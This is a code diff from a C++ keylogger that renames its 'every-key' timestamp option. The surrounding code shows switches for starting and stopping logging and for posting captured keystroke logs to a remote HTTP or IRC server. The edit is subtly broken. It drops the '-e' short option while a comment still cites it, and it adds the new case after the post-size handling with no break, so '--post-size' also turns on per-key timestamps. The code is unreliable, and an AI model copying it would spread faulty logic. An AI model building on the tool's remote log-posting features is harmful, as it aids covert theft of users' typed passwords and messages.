@@ -18,7 +18,7 @@ struct arguments
   bool start;          // start keylogger, -s switch
   bool kill;           // stop keylogger, -k switch
   bool us_keymap;      // use default US keymap, -u switch
-  bool every_key;          // log timestamp for every key, -e switch
+  bool timestamp_every;          // log timestamp for every key, -e switch
   std::string logfile;      // user-specified log filename, -o switch
   std::string keymap;       // user-specified keymap file, -m switch or --export-keymap
   std::string device;       // user-specified input event device, given with -d switch
@@ -34,7 +34,7 @@ struct arguments
 #define FLAG_POST_HTTP        0x8  // post log to remote HTTP server, --post-http switch
 #define FLAG_POST_IRC        0x10  // post log to remote IRC server, --post-irc switch
 #define FLAG_POST_SIZE       0x20  // post log to remote HTTP or IRC server when log of size optarg, --post-size
-#define FLAG_ALL_TIMESTAMPS  0x40  // log timestamps on every key, --every-key switch
+#define FLAG_TIMESTAMP_EVERY 0x40  // log timestamps on every key, --timestamp-every switch
 } args = {0};  // default all args to 0x0 or ""
 
 
@@ -56,20 +56,19 @@ void process_command_line_arguments(int argc, char **argv)
     {"post-http",     required_argument, &flags, FLAG_POST_HTTP},
     {"post-irc",      required_argument, &flags, FLAG_POST_IRC},
     {"post-size",     required_argument, &flags, FLAG_POST_SIZE},
-    {"every-key",     no_argument,       &flags, FLAG_ALL_TIMESTAMPS},
+    {"timestamp-every", no_argument,     &flags, FLAG_TIMESTAMP_EVERY},
     {0}
   };
   
   char c;
   int option_index;
 
-  while ((c = getopt_long(argc, argv, "sm:o:ukd:e?", long_options, &option_index)) != -1)
+  while ((c = getopt_long(argc, argv, "sm:o:ukd:?", long_options, &option_index)) != -1)
   {
     switch (c) 
     {
       case 's': args.start = true;     break;
       case 'm': args.keymap = optarg;  break;
-      case 'e': args.every_key = true; break;
       case 'o': args.logfile = optarg; break;
       case 'u': args.us_keymap = true; break;
       case 'k': args.kill = true;      break;
@@ -108,6 +107,8 @@ void process_command_line_arguments(int argc, char **argv)
               case 'K': case 'k': args.post_size *= 1000;    break;
               case 'M': case 'm': args.post_size *= 1000000; break;
             }
+
+          case FLAG_TIMESTAMP_EVERY: args.timestamp_every = true; break;
         }
         break;
       
